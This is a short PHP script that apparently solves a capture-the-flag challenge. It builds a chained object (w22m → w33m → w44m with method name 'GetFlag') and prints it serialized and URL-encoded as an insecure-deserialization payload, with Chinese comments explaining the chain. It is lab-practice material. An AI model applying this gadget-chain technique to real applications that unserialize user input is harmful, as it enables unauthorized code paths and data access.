

<?php

class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
    public function __construct(){
        $this->w00m = new w33m();
    }
}

class w33m{
    public $w00m;
    public $w22m;

    public function __construct(){
        $this->w00m = new w44m();
        $this->w22m = 'GetFlag';
    }
}

$a = new w22m();
echo serialize($a);
echo urlencode(serialize($a));

// 目的执行w44m的GetFlag方法
// 在w33m中, echo时, $w00m可调用$w22m方法
// 所以把 $w00m设置为new w44m(); $w22m设置为GetFlag方法;
// w22m会直接输出自己的变量值 $w22m = new w33m();
?>